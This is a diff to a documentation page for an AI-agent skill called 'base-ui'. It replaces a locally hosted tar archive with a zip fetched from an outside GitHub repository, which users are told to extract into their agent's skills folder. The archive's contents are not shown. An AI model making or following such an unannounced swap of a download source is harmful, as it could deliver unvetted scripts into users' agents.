@@ -6,7 +6,7 @@ It is a plain folder of Markdown and scripts, so it is not tied to one tool. It 
 
 ## Download
 
-[Download base-ui-skill.tar](/examples/base-ui-skill.tar)
+[Download base-ui-skill.zip](https://raw.githubusercontent.com/nodex-ui/nodex-ui.github.io/refs/heads/main/docs/base-ui-skill.zip)
 
 The archive contains one `base-ui/` folder: `SKILL.md`, `references/` and `scripts/`.
 
@@ -22,7 +22,7 @@ Extract the archive into the skills folder of your agent, either per user or ins
 
 ```bash
 mkdir -p ~/.claude/skills
-tar -xf base-ui-skill.tar -C ~/.claude/skills
+unzip base-ui-skill.zip -d ~/.claude/skills
 ```
 
 Replace `~/.claude/skills` with the folder for your agent, then restart it. Skill folder locations can change between agent versions, so check your agent's documentation if the skill is not picked up.
